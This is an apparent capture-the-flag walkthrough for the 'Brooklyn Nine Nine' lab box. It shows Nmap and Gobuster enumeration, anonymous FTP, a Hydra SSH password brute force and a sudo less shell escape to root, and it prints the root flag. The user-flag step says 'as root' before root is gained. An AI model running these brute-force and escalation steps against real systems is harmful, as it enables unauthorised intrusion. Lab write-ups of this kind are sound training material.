#  Brooklyn Nine Nine

## 1. Enumeration (Finding Services)
We always start with **Nmap** to discover open ports and services.

```bash
nmap -sC -sV -oN nmap.txt <target-ip>
```

- **-sC** → runs default scripts (like checking for anonymous FTP, SSL info, etc.).  
- **-sV** → detects service versions (e.g., Apache 2.4.29, OpenSSH 7.6).  
- **-oN nmap.txt** → saves results to a file for documentation.  

### Findings:
- **21/tcp FTP** → anonymous login allowed, file `note_to_jake.txt`.  
- **22/tcp SSH** → OpenSSH service, potential login point.  
- **80/tcp HTTP** → Apache web server, default page.  

 This tells us: FTP has a clue, SSH is the entry point, HTTP may hide directories.

---

## 2. FTP Enumeration
Login anonymously:

```bash
ftp <target-ip>
# Username: anonymous
# Password: (just press Enter)
```

List files:
```bash
ls -la
```

Download the note:
```bash
get note_to_jake.txt
```

Contents:
```
From Amy,
Jake please change your password. It is too weak...
```

 Clue: Jake’s password is weak → brute force candidate.

---

## 3. Web Enumeration
Check the site:
```bash
http://<target-ip>
```

Run Gobuster to find hidden directories:
```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- **dir** → directory brute force mode.  
- **-u** → target URL.  
- **-w** → wordlist file.  

 This may reveal `/admin`, `/robots.txt`, or other hidden paths. In this box, the main clue is still Jake’s weak password.

---

## 4. Brute Force SSH
Use Hydra to crack Jake’s password:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
```

- **-l jake** → username Jake.  
- **-P rockyou.txt** → password list.  
- **ssh://** → target service.  

 Hydra finds Jake’s weak password.

---

## 5. User Access
Login via SSH:
```bash
ssh jake@<target-ip>
```

Check Jake’s home directory:
```bash
ls -la /home/jake
```

 Normally you’d find `user.txt` here, but in this box it’s hidden in `/home/holt/user.txt`.  
As root you can read it:
```bash
cat /home/holt/user.txt
```

 That’s the **user flag**.

---

## 6. Privilege Escalation
Check sudo permissions:
```bash
sudo -l
```

Output:
```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Jake can run `less` as root without a password.

Exploit:
```bash
sudo less /etc/passwd
```

Inside `less`, type:
```
!/bin/bash
```

Now you’re root:
```bash
whoami
# root
```

---

## 7. Root Flag
Read the root flag:
```bash
cat /root/root.txt
```

Output:
```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
```




- **Nmap**: Always start with service discovery.  
- **FTP**: Anonymous login often leaks clues.  
- **Gobuster**: Use wordlists to find hidden directories.  
- **Hydra**: Brute force weak credentials.  
- **SSH**: Entry point once creds are cracked.  
- **sudo -l**: Always check for privilege escalation paths.  
- **less exploit**: Many binaries allow shell escape (`!bash`).  

